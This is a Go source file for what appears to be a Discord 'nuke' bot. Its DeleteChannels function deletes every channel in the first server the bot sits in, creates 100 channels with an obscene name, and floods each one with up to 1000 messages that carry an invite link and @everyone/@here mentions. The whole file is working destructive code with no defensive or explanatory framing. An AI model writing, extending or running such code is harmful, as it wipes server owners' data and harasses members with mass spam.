package commands

import (
	"fmt"

	"time"

	"github.com/bwmarrin/discordgo"
)

func DeleteChannels(s *discordgo.Session) {

	if len(s.State.Guilds) == 0 {

		fmt.Println("The Bot is not located on a server.")

		return

	}

	guildID := s.State.Guilds[0].ID

	channels, err := s.GuildChannels(guildID)

	if err != nil {

		fmt.Println("Error getting channels:", err)

		return

	}

	for _, ch := range channels {

		_, err := s.ChannelDelete(ch.ID)

		if err != nil {

			fmt.Println("Error deleting channels:", ch.Name)

		} else {

			fmt.Println("Deleted channel:", ch.Name)

		}

	}

	for i := 1; i <= 100; i++ {
		channelName := fmt.Sprintf("FuckedByHave%d", i)

		newCh, err := s.GuildChannelCreate(guildID, channelName, discordgo.ChannelTypeGuildText)
		if err != nil {
			fmt.Printf("❌ Error al crear canal %d: %v\n", i, err)
			continue
		}

		fmt.Printf("Channel Created: %s\n", newCh.Name)

		go func(chID string) {
			for m := 1; m <= 1000; m++ {
				_, err := s.ChannelMessageSend(chID, "Server Have https://discord.gg/ @everyone @here")
				if err != nil {
					break
				}
				time.Sleep(350 * time.Millisecond)
			}
		}(newCh.ID)

		time.Sleep(200 * time.Millisecond)
	}
}
